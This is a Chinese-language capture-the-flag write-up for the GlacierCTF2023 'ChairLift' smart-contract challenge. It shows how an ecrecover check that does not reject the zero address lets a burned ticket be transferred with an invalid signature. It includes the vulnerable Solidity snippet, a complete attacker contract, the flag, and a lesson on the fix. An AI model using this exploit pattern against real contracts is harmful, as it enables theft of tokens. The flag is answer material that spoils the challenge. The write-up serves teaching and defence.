# GlacierCTF2023 - ChairLift

## 题目简述

`Setup` 部署 `ChairLift` 后免费铸造票号 0，调用一次 `takeRide(0)` 并销毁该票，因此 `tripsTaken == 1`。玩家必须再乘坐一次，但正常购票需要 `100000 ether`。`Ticket` 合约提供基于 EIP-712 摘要与 `ecrecover` 的 `transferWithPermit`。

## 解题过程

`ecrecover` 遇到无效签名时不会 revert，而是返回 `address(0)`。合约只检查 `signer == from`，没有拒绝零地址：

```solidity
address signer = ecrecover(digest, v, r, s);
require(signer == from, "Ticket: invalid permit");
_transfer(from, to, tokenId);
```

票号 0 已被烧毁，`ownerOf(0)` 正好也是 `address(0)`。因此把 `from` 设为零地址，并提交会使 `ecrecover` 返回零地址的无效签名，签名检查和 `_transfer` 的所有权检查都会通过，票号 0 被“复活”到攻击合约名下。

```solidity
contract Attacker {
    ChairLift target;
    Ticket ticket;

    constructor(address target_) {
        target = ChairLift(target_);
        ticket = target.ticket();
    }

    function attack() external {
        ticket.transferWithPermit(
            address(0), address(this), 0,
            block.timestamp + 100, 1, bytes32(0), bytes32(0)
        );
        target.takeRide(0);
    }
}
```

第二次乘坐后 `tripsTaken == 2`，`isSolved()` 成立，获得：

```text
gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}
```

## 方法总结

使用 `ecrecover` 时必须显式拒绝 `address(0)`，并对 `from`、`to` 和 token 是否真实存在分别校验。烧毁状态也不能只用零地址所有权表示后继续允许普通转移，否则无效签名与“未拥有”状态会组合成伪造所有权。
